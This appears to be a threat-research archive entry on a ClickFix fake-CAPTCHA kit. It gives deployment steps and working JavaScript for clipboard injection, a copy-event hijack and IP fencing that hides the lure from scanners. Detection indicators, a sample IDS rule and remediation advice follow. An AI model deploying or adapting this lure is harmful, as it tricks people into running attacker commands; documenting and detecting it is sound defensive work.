# ClickFix Fake-CAPTCHA Social-Engineering Kit with IP Fencing and 19-Language Localization

---

## Metadata

| Field | Value |
|---|---|
| **Date Added** | 2026-07-27 |
| **Last Updated** | 2025-11-21 (upstream repo creation date; no later commits observed) |
| **Author / Researcher** | Blake White (blwhit) |
| **CVE / Advisory** | N/A (social-engineering technique, not a software vulnerability) |
| **Category** | social-engineering |
| **Severity** | High |
| **CVSS Score** | N/A |
| **Status** | PoC (benign placeholder payload) |
| **Tags** | clickfix, fake-captcha, clipboard-injection, ip-fencing, localization, social-engineering, phishing, run-dialog, cloudflare-worker |
| **Related** | pocs/social-engineering/2026-07-27_clickfix-cloudflare-turnstile-lure/ (upstream base this repo forks from) |

---

## Affected Target

| Field | Value |
|---|---|
| **Software / System** | End users of Windows workstations (via Run dialog / PowerShell paste-and-execute); no vulnerable software component |
| **Versions Affected** | N/A — technique targets human behavior, not a specific software version |
| **Language / Platform** | JavaScript, deployed as a Cloudflare Worker (single-file `fetch` handler serving inlined HTML/CSS/JS) |
| **Authentication Required** | No |
| **Network Access Required** | Yes — victim must load the hosted fake CAPTCHA page |

---

## Summary

This is a fork of `0x204/ClickFix-Turnstile` that adds two enhancements: real IP allow/block fencing at the Cloudflare Worker edge (checking the `cf-connecting-ip` request header against a hardcoded `ALLOWED_IPS[]` array before serving content), and genuine 19-language auto-localization of the lure page based on the victim browser's language. The page itself implements the classic ClickFix pattern: a fake "I'm not a robot" checkbox that, on click, silently copies an attacker-defined command (`CONFIG.command`, a plain string placeholder in this repo) to the clipboard and walks the victim through a fabricated verification flow instructing them to press Win+R, paste with Ctrl+V, and press Enter — which executes whatever command the operator configured. The shipped default payload is an inert placeholder string ("Your Clipboard Command Here"), so this repository, as published, does not execute anything malicious; it is a reusable lure template that an attacker would need to weaponize by supplying a real command.

## Correction to Upstream Claims

The upstream repository's name and README describe the project as integrating "Cloudflare Turnstile CAPTCHA." This claim was checked directly against the source and found to be false / marketing overstatement: a full-text search of `ClickFix.js` (1212 lines) for `turnstile`, `sitekey`, `siteverify`, and `challenges.cloudflare.com` returns zero matches. There is no real Turnstile widget, sitekey, or server-side siteverify call anywhere in the code. The "CAPTCHA" is a hand-built fake checkbox/spinner/success-icon UI rendered with plain HTML/CSS/JS that only visually imitates a CAPTCHA challenge — it never talks to any Cloudflare Turnstile API. This writeup treats the "Turnstile" branding in the repo name/README as inaccurate self-description and describes the actual mechanism (fake CAPTCHA UI + clipboard hijack) rather than repeating the claim.

---

## Vulnerability Details

### Root Cause

ClickFix is not a software vulnerability but a social-engineering technique that abuses two facts: (1) browsers allow web pages to programmatically write to the clipboard (via the `copy` event or `execCommand`/Clipboard API), and (2) Windows lets a user paste and immediately run an arbitrary command line from the Run dialog (Win+R) or a terminal without any additional confirmation of what was actually pasted. The lure page never shows the victim the command it copies — it only shows fabricated "verification steps."

### Attack Vector

1. Victim is directed (via phishing email, malvertising, compromised site, or fake update prompt) to the hosted lure page.
2. The Cloudflare Worker `fetch` handler (`ClickFix.js` lines 4-11) first checks `request.headers.get('cf-connecting-ip')` against the `ALLOWED_IPS[]` array (line 2); if the array is non-empty and the visitor IP is not listed, the Worker returns a bare `403 Access Denied` instead of the lure — this lets an operator restrict the live payload to a target IP range/organization and show nothing (or a clean 403) to scanners, sandboxes, and unintended visitors.
3. If allowed, the Worker serves inlined `HTML`/`JS`/`CSS` template literals. The page auto-detects the browser's language and selects matching copy from the `I18N` object (lines 161+, 19 locales: en, de, fr, it, ar, zh, ja, ru, es, pt, nl, tr, ko, hi, id, vi, th, uk, cs) so the fake verification instructions read naturally to non-English-speaking victims.
4. Victim clicks the fake "I'm not a robot" checkbox. The click handler (around line 757) calls `copyToClipboard(CONFIG.command)`, silently placing the operator-configured command string on the clipboard, and a `document.addEventListener('copy', ...)` hijack (lines 819-825) additionally rewrites any copy event's clipboard data to `CONFIG.command` as a fallback/redundant copy path.
5. The page then displays fabricated "Verification Steps": press Win+R, press Ctrl+V, press Enter — a fake verification ID and Cloudflare-style "Ray ID" are rendered to add authenticity.
6. If the victim follows the on-screen steps, the pasted command executes via `cmd.exe`/PowerShell with no sandboxing or additional prompt.

### Impact

If deployed with a real payload (this repo ships only a placeholder string), a victim who completes the fake CAPTCHA flow will execute an attacker-chosen command line with their own user privileges — this is commonly used in the wild to launch PowerShell one-liners that download and run infostealers, RATs, or loaders. The IP-fencing feature increases operational stealth by letting the operator show the working lure only to intended targets while returning a bare 403 to everyone else (crawlers, sandbox IPs, security researchers), and the localization feature broadens the pool of victims who will read the fake instructions as legitimate.

---

## Environment / Lab Setup

```
Target:      Any browser reaching the hosted page (Chrome/Edge/Firefox on Windows is the realistic target since the payload assumes Win+R / PowerShell)
Hosting:     Cloudflare Workers (the code is a single `export default { async fetch(request) {...} } ` module)
Attacker:    Cloudflare account + wrangler CLI (or the Workers dashboard) to deploy ClickFix.js
Tools:       Browser dev tools to observe clipboard writes; a Windows VM to safely observe the Win+R paste-and-execute step without running a real payload
```

### Setup Steps

```bash
# 0. ClickFix.js ships inside a password-protected zip (see Notes for why),
#    not as a plaintext file. Unzip first:
unzip -P infected poc-files.zip

# 1. Use the extracted, archived copy in this folder (real upstream file, unmodified)
#    ClickFix.js contains the full Worker: HTML + CSS + JS inlined as template literals

# 2. Set a payload command (replace the placeholder before any lab test):
#    const CONFIG = { command: "calc.exe" };   # benign test command only

# 3. Optionally restrict delivery to lab IPs:
#    const ALLOWED_IPS = ["203.0.113.10"];      # empty array = serve to everyone

# 4. Deploy as a Cloudflare Worker
wrangler deploy ClickFix.js
```

---

## Proof of Concept

### Step-by-Step Reproduction

1. **Deploy** — Publish `ClickFix.js` as a Cloudflare Worker (or adapt the inlined `HTML`/`JS`/`CSS` constants to any static host).
   ```bash
   wrangler deploy ClickFix.js
   ```

2. **Configure the lure** — Edit the two operator-controlled values before deployment:
   ```javascript
   const ALLOWED_IPS = [];                 // non-empty = restrict to these client IPs, else open to all
   const CONFIG = { command: "..." };      // the string copied to the clipboard on checkbox click
   ```

3. **Visit the page from an allow-listed (or unrestricted) client** — the Worker's `fetch` handler checks `cf-connecting-ip` (line 6) before returning content; disallowed IPs receive `403 Access Denied` (line 10) instead of the lure.

4. **Observe localization** — load the page with different `Accept-Language`/browser-locale settings and confirm the CAPTCHA copy switches among the 19 `I18N` locales (lines 161- onward) automatically.

5. **Click the fake checkbox** — confirms `copyToClipboard(CONFIG.command)` fires (line 757) and the clipboard now holds `CONFIG.command`, followed by the fabricated Win+R / Ctrl+V / Enter instructions.

### Exploit Code

> Real upstream file archived as-is: `ClickFix.js` (1212 lines), packaged inside `poc-files.zip` (password: `infected`) in this folder — see Notes for why it is zipped rather than committed as plaintext.

```javascript
// Core mechanism excerpted from ClickFix.js (unmodified lines shown for reference):

// IP fencing (lines 2-11)
const ALLOWED_IPS = [];
export default {
    async fetch(request) {
        const clientIP = request.headers.get('cf-connecting-ip');
        if (ALLOWED_IPS.length > 0 && !ALLOWED_IPS.includes(clientIP)) {
            return new Response('Access Denied', { status: 403 });
        }
        // ... serves inlined HTML/JS/CSS otherwise
    }
};

// Clipboard injection on fake-checkbox click (line ~757)
checkbox.addEventListener("click", function () {
    copyToClipboard(CONFIG.command);
    // ... then reveals fabricated "verification steps" (Win+R, Ctrl+V, Enter)
});

// Redundant copy-event hijack (lines 819-825)
document.addEventListener('copy', function (e) {
    e.preventDefault();
    if (e.clipboardData) {
        e.clipboardData.setData('text/plain', CONFIG.command);
    } else if (window.clipboardData) {
        window.clipboardData.setData('Text', CONFIG.command);
    }
});
```

### Expected Output

```
# On an allow-listed / unrestricted client visiting the page:
- Localized fake CAPTCHA renders (language matches browser locale, 19 supported)
- Clicking the checkbox silently places CONFIG.command on the system clipboard
- Fabricated "Verification Steps" instruct: Win+R -> Ctrl+V -> Enter
- If followed, CONFIG.command executes via the Windows Run dialog

# On a disallowed client (ALLOWED_IPS non-empty and IP not listed):
HTTP/1.1 403 Forbidden
Access Denied
```

---

## Screenshots / Evidence

- Upstream README screenshot shows the rendered fake CAPTCHA/verification UI (see `upstream-README.md` in this folder for the original image reference).

---

## Detection & Indicators of Compromise

```
# Clipboard content matching an unexpected shell/PowerShell one-liner immediately
# followed by Win+R (RunMRU registry key update) or a new powershell.exe/cmd.exe
# process launched from Explorer with no parent browser/document context.
```

**Signs of compromise:**
- New `RunMRU` registry entries followed almost immediately by a suspicious `powershell.exe -w hidden -c ...` or `cmd.exe /c ...` process with no corresponding user-typed history
- Browser process history showing a visit to an unfamiliar "verification"/CAPTCHA-branded page immediately preceding the process launch
- Outbound requests to a domain serving a page whose HTML matches the structure of this template (checkbox + step0/step1/step2/step3 verification panels, fake Ray ID / verification ID fields)
- Network telemetry showing the same client IP repeatedly probing a suspected lure host and receiving `403` (consistent with `ALLOWED_IPS` fencing rejecting non-target traffic) while a small number of specific target IPs receive `200` with full page content

**SIEM / IDS Rule (example, conceptual):**
```
alert http any any -> any any (msg:"Possible ClickFix fake-CAPTCHA lure page"; content:"verification-id"; http_client_body; content:"fa-windows"; http_client_body; sid:9000101;)
```

---

## Remediation

| Action | Detail |
|---|---|
| **Primary fix** | Not applicable — this is an awareness/technique problem, not a patchable vulnerability |
| **User awareness** | Train users that no legitimate CAPTCHA or verification flow ever asks them to open the Run dialog or paste/execute a command; treat any such instruction as malicious |
| **Config hardening** | Restrict or monitor use of the Run dialog (`Win+R`) and clipboard-to-execution paths via Group Policy / endpoint controls; enable PowerShell Constrained Language Mode and script-block logging; consider disabling `Win+R` for high-risk user groups |
| **Network controls** | Block/flag newly registered or category-uncategorized domains serving CAPTCHA-styled pages; alert on outbound traffic to Cloudflare Workers subdomains (`*.workers.dev`) hosting suspicious content |

---

## References

- [Source repository — blwhit/ClickFix-FakeCaptcha-Cloudflare](https://github.com/blwhit/ClickFix-FakeCaptcha-Cloudflare)
- [Upstream base — 0x204/ClickFix-Turnstile](https://github.com/0x204/ClickFix-Turnstile)

---

## Notes

Verified before ingestion: the real `ClickFix.js` (1212 lines) was cloned and read directly (not paraphrased from the README). Confirmed genuine functionality: real IP allow/block fencing checking the Cloudflare `cf-connecting-ip` header against a hardcoded `ALLOWED_IPS[]` array in the Worker `fetch` handler (lines 2-11), and real 19-language auto-localization via a full `I18N` object (en, de, fr, it, ar, zh, ja, ru, es, pt, nl, tr, ko, hi, id, vi, th, uk, cs — counted directly in the source, lines 161-522) with browser-language detection. Clipboard injection via `CONFIG.command` (default placeholder string, benign/configurable) is wired into both the fake-checkbox click handler and a `copy`-event hijack. No payment gating, no Telegram/Discord C2, no obfuscation, and no hidden droppers were found; the only external network calls in the page are cosmetic (Font Awesome CDN stylesheet, Google/DuckDuckGo favicon lookups, one static logo image host) — none of these affect the clipboard-injection logic.

CRITICAL CORRECTION: the upstream repository's name ("ClickFix-FakeCaptcha-Cloudflare") and its own README explicitly claim to "Integrate Cloudflare Turnstile CAPTCHA." This claim does not hold up: a full-text grep of the actual `ClickFix.js` source for `turnstile`, `sitekey`, `siteverify`, and `challenges.cloudflare.com` returns zero matches. There is no real Turnstile widget or server-side verification anywhere in the code — the "CAPTCHA" is entirely a hand-built fake checkbox/spinner/success-icon UI that only visually imitates a CAPTCHA challenge. This is flagged here so the false claim is not repeated uncritically in this archive.

Author attribution: Blake White (GitHub handle `blwhit`), account active since 2023, 201 followers, security-tools-focused bio — an established, identifiable researcher, not an anonymous/throwaway account. Repository created 2025-11-21, 12 stars / 8 forks at time of review, explicitly forked from `0x204/ClickFix-Turnstile` (also archived separately in this repository at `pocs/social-engineering/2026-07-27_clickfix-cloudflare-turnstile-lure/`) with the IP-fencing and localization features added on top of that base. The README states the project is "Created for educational/research/blue-team purposes only."

This entry documents a SOCIAL-ENGINEERING / AWARENESS technique, not a software vulnerability — no CVE applies and none was assigned. The shipped `CONFIG.command` value is an inert placeholder string ("Your Clipboard Command Here"); the repository as published does not execute any malicious payload on its own.

**Distribution note:** `ClickFix.js` is packaged as `poc-files.zip` (password: `infected`, the standard convention used across the malware/threat-research community, e.g. MalwareBazaar and VX-Underground) rather than committed as a plaintext file. ClickFix is a heavily fingerprinted technique — browsing plaintext ClickFix source directly on GitHub triggered AV/browser heuristic blocking (ESET and Chromium-based Safe Browsing signatures) for at least one user of this archive, even though nothing executes just from viewing source on GitHub. Zipping avoids automated signature scanning while keeping the verified, byte-identical content available to anyone doing legitimate research.
